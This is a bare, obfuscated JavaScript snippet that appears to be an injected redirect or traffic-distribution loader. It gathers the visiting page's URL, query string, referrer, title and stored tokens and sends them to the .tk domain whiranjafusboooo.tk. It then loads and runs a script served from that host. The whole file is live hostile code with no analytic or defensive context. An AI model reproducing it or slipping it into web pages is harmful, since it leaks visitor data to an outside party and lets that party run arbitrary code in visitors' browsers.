(function() {
    var name = '_3QkNDPLZXm7jQrbQ';
    if (!window._3QkNDPLZXm7jQrbQ) {
        window._3QkNDPLZXm7jQrbQ = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://whiranjafusboooo.tk/Nx69qk',
            P_PATH: 'https://whiranjafusboooo.tk/fec84ce/postback',
        };
    }
    const _RSYrwbXqN7PRNP2V = localStorage.getItem('config');
    if (typeof _RSYrwbXqN7PRNP2V !== 'undefined' && _RSYrwbXqN7PRNP2V !== null) {
        var _MZsqwC3TgFhbhfzc = JSON.parse(_RSYrwbXqN7PRNP2V);
        var _vZKm8GYBFCTYfLsc = Math.round(+new Date()/1000);
        if (_MZsqwC3TgFhbhfzc.created_at + window._3QkNDPLZXm7jQrbQ.ttl < _vZKm8GYBFCTYfLsc) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _fNvz1MCTds4ccgDQ = localStorage.getItem('subId');
    var _fjQ1Pzx4tcJrT5wh = localStorage.getItem('token');
    var _YQXgVRGdYM15CMdJ = '?return=js.client';
        _YQXgVRGdYM15CMdJ += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _YQXgVRGdYM15CMdJ += '&se_referrer=' + encodeURIComponent(document.referrer);
        _YQXgVRGdYM15CMdJ += '&default_keyword=' + encodeURIComponent(document.title);
        _YQXgVRGdYM15CMdJ += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _YQXgVRGdYM15CMdJ += '&name=' + encodeURIComponent(name);
        _YQXgVRGdYM15CMdJ += '&host=' + encodeURIComponent(window._3QkNDPLZXm7jQrbQ.R_PATH);
    if (typeof _fNvz1MCTds4ccgDQ !== 'undefined' && _fNvz1MCTds4ccgDQ && window._3QkNDPLZXm7jQrbQ.unique) {
        _YQXgVRGdYM15CMdJ += '&sub_id=' + encodeURIComponent(_fNvz1MCTds4ccgDQ);
    }
    if (typeof _fjQ1Pzx4tcJrT5wh !== 'undefined' && _fjQ1Pzx4tcJrT5wh && window._3QkNDPLZXm7jQrbQ.unique) {
        _YQXgVRGdYM15CMdJ += '&token=' + encodeURIComponent(_fjQ1Pzx4tcJrT5wh);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._3QkNDPLZXm7jQrbQ.R_PATH + _YQXgVRGdYM15CMdJ;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
